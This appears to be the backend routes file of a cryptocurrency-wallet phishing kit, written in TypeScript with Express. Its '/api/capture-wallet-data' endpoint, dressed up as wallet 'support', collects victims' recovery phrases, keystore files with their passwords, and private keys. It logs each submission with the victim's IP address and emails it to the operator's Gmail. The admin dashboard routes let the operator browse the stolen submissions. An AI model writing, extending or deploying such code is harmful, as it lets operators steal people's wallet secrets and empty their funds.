
import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import nodemailer from 'nodemailer';
import { randomUUID } from "crypto";

// Gmail configuration
const GMAIL_USER = process.env.GMAIL_USER || 'your-email@gmail.com'; // Replace with your Gmail
const GMAIL_APP_PASSWORD = process.env.GMAIL_APP_PASSWORD || ''; // Gmail App Password

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: GMAIL_USER,
    pass: GMAIL_APP_PASSWORD,
  },
});

// Admin authentication middleware
const requireAdmin = async (req: any, res: any, next: any) => {
  const sessionToken = req.headers.authorization?.replace('Bearer ', '');
  
  if (!sessionToken) {
    return res.status(401).json({ error: 'No session token provided' });
  }

  const session = await storage.getAdminSession(sessionToken);
  if (!session) {
    return res.status(401).json({ error: 'Invalid or expired session' });
  }

  const user = await storage.getUser(session.userId);
  if (!user?.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }

  req.user = user;
  req.session = session;
  next();
};

export async function registerRoutes(app: Express): Promise<Server> {
  // Capture wallet connection data, send to Gmail AND store in database
  app.post('/api/capture-wallet-data', async (req, res) => {
    try {
      const { wallet, method, data, timestamp, category, categoryTitle } = req.body;
      
      // Store in database first
      const submission = await storage.createSubmission({
        wallet,
        method,
        data,
        category,
        categoryTitle,
        ipAddress: req.ip || req.connection.remoteAddress,
        userAgent: req.get('User-Agent'),
      });
      
      // Prepare email content
      let emailContent = `
        <h2>🔍 Wallet Connection - ${categoryTitle || 'Support'}</h2>
        <h3>Issue Details:</h3>
        <p><strong>Submission ID:</strong> ${submission.id}</p>
        <p><strong>Category:</strong> ${categoryTitle || 'General Support'}</p>
        <p><strong>Category Slug:</strong> ${category || 'unknown'}</p>
        <p><strong>Timestamp:</strong> ${timestamp}</p>
        <p><strong>Wallet:</strong> ${wallet}</p>
        <p><strong>Connection Method:</strong> ${method}</p>
        <p><strong>IP Address:</strong> ${req.ip || 'Unknown'}</p>
        <hr>
      `;

      if (method === 'phrase') {
        emailContent += `
          <h3>Recovery Phrase:</h3>
          <p style="background: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace;">
            ${data.phrase}
          </p>
        `;
      } else if (method === 'keystore') {
        emailContent += `
          <h3>Keystore File:</h3>
          <p><strong>Password:</strong> ${data.password}</p>
          <details>
            <summary>Keystore Content</summary>
            <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px; overflow-x: auto;">
              ${data.keystore}
            </pre>
          </details>
        `;
      } else if (method === 'privateKey') {
        emailContent += `
          <h3>Private Key:</h3>
          <p style="background: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace;">
            ${data.privateKey}
          </p>
        `;
      }

      emailContent += `
        <hr>
        <p><em>This data is also stored in your admin dashboard for management.</em></p>
      `;

      // Send email
      const mailOptions = {
        from: GMAIL_USER,
        to: GMAIL_USER, // Send to yourself
        subject: `🔍 ${categoryTitle || 'Support'} - ${wallet} (${method})`,
        html: emailContent,
      };

      await transporter.sendMail(mailOptions);

      res.json({ success: true, message: 'Data captured successfully', submissionId: submission.id });
    } catch (error) {
      console.error('Error capturing wallet data:', error);
      res.status(500).json({ success: false, message: 'Failed to capture data' });
    }
  });

  // Admin Authentication Routes
  app.post('/api/admin/login', async (req, res) => {
    try {
      const { username, password } = req.body;
      
      const user = await storage.getUserByUsername(username);
      if (!user || !user.isAdmin || user.password !== password) {
        return res.status(401).json({ error: 'Invalid credentials' });
      }

      // Create session
      const sessionToken = randomUUID();
      const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000); // 24 hours
      
      const session = await storage.createAdminSession({
        userId: user.id,
        sessionToken,
        expiresAt,
      });

      res.json({ 
        success: true, 
        sessionToken, 
        user: { 
          id: user.id, 
          username: user.username, 
          isAdmin: user.isAdmin 
        },
        expiresAt 
      });
    } catch (error) {
      console.error('Admin login error:', error);
      res.status(500).json({ error: 'Login failed' });
    }
  });

  app.post('/api/admin/logout', requireAdmin, async (req: any, res) => {
    try {
      await storage.deleteAdminSession(req.session.sessionToken);
      res.json({ success: true });
    } catch (error) {
      console.error('Admin logout error:', error);
      res.status(500).json({ error: 'Logout failed' });
    }
  });

  // Admin Dashboard Routes
  app.get('/api/admin/dashboard/stats', requireAdmin, async (req, res) => {
    try {
      const stats = await storage.getSubmissionStats();
      res.json(stats);
    } catch (error) {
      console.error('Error getting dashboard stats:', error);
      res.status(500).json({ error: 'Failed to get stats' });
    }
  });

  app.get('/api/admin/submissions', requireAdmin, async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 50;
      const offset = parseInt(req.query.offset as string) || 0;
      
      const submissions = await storage.getSubmissions(limit, offset);
      res.json(submissions);
    } catch (error) {
      console.error('Error getting submissions:', error);
      res.status(500).json({ error: 'Failed to get submissions' });
    }
  });

  app.get('/api/admin/submissions/:id', requireAdmin, async (req, res) => {
    try {
      const submission = await storage.getSubmissionById(req.params.id);
      if (!submission) {
        return res.status(404).json({ error: 'Submission not found' });
      }
      res.json(submission);
    } catch (error) {
      console.error('Error getting submission:', error);
      res.status(500).json({ error: 'Failed to get submission' });
    }
  });

  app.get('/api/admin/users', requireAdmin, async (req, res) => {
    try {
      // Get all users (in a real app, you'd implement this in storage)
      // For now, return empty array since we don't have a getUsers method
      res.json([]);
    } catch (error) {
      console.error('Error getting users:', error);
      res.status(500).json({ error: 'Failed to get users' });
    }
  });

  // Verify admin session
  app.get('/api/admin/verify', requireAdmin, async (req: any, res) => {
    res.json({ 
      valid: true, 
      user: { 
        id: req.user.id, 
        username: req.user.username, 
        isAdmin: req.user.isAdmin 
      } 
    });
  });

  // Health check endpoint
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
  });

  const httpServer = createServer(app);
  return httpServer;
}
